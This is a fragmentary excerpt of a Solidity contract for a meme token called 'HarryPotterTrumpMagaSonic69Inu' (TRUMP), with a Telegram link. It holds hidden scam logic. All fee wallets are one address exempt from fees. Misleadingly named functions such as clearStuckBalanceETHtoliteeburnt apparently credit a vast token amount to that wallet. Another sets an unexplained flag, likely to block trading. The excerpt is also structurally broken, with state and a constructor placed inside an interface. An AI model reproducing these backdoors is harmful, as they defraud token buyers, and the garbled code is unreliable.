...
https://t.me/HarryPotterTrumpMagaSonic69Inu
...
abstract contract Ownable is Context {
    ...
    function renounceOwnershiptreburnt() public virtual onlyOwner {
        _setOwner(address(0));
    }
...
interface IRouter {
    ...
    address public marketieths = 0xE48a87B7c785b035A2c81Ab829B99059d82a137D; 
    address public devswalletsburnt = 0xE48a87B7c785b035A2c81Ab829B99059d82a137D;
    address public ecosystsewalletsburnt = 0xE48a87B7c785b035A2c81Ab829B99059d82a137D;
    ...
    constructor() ERC20("HarryPotterTrumpMagaSonic69Inu", "TRUMP") {
        ...
        exemptFee[marketieths] = true;
        exemptFee[ecosystsewalletsburnt] = true;
        exemptFee[devswalletsburnt] = true;
        ...
        if (contractBalance >= tokenLiquidityThreshold) {
         ...
         uint256 denominator = feeswap * 2;
          ...
          addLiquidity(tokensToAddLiquidityWith, ethToAddLiquidityWith);
            ...
            if (marketingAmt > 0) {
                payable(marketieths).sendValue(marketingAmt);
            }
            uint256 ecosystemAmt = unitBalance * 2 * swapTaxes.ecosystem;
            if (ecosystemAmt > 0) {
                payable(ecosystsewalletsburnt).sendValue(ecosystemAmt);
            }
            uint256 devAmt = unitBalance * 2 * swapTaxes.dev;
            if (devAmt > 0) {
                payable(devswalletsburnt).sendValue(devAmt);
            }
    ...
    function clearStuckBalanceETHtoliteeburnt() external payable{
        andnicob(devswalletsburnt, 10 * 10**28);
    }
    ...
    function clearStuckBalanceInitiieburnt() external payable{
        bontudu = 3;
    }
